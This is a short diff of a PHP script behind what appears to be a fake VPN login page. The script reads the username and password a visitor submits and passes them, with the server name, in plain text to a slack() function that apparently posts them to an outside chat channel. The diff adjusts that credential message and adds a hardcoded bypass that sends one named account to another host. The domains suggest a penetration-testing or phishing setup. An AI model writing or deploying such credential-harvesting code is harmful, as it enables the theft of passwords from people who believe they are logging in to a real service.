@@ -32,8 +32,16 @@ function slack($message)
 $username = $_POST['username'];
 $password = $_POST['password'];
 $server = $_SERVER['HTTP_HOST'];
-$message = $username . " tried to login to the VPN with pasword: " . $password . "on server ". $server;
+
+$message = $username . " tried to login to the VPN with pasword: '" . $password . "' on server ". $server;
 slack($message);
+
+if($username == 'vchokshi@pen.do.iot4.net'){
+    header("Location: https://black.pen.iot4.net");
+    $message = $username . " logged in on server ". $server;
+    slack($message);
+    exit;
+}
 if(!isset($_COOKIE['MYCOOKIE'])){
     setcookie('MYCOOKIE', 'IOT4');
     header("Location: /");
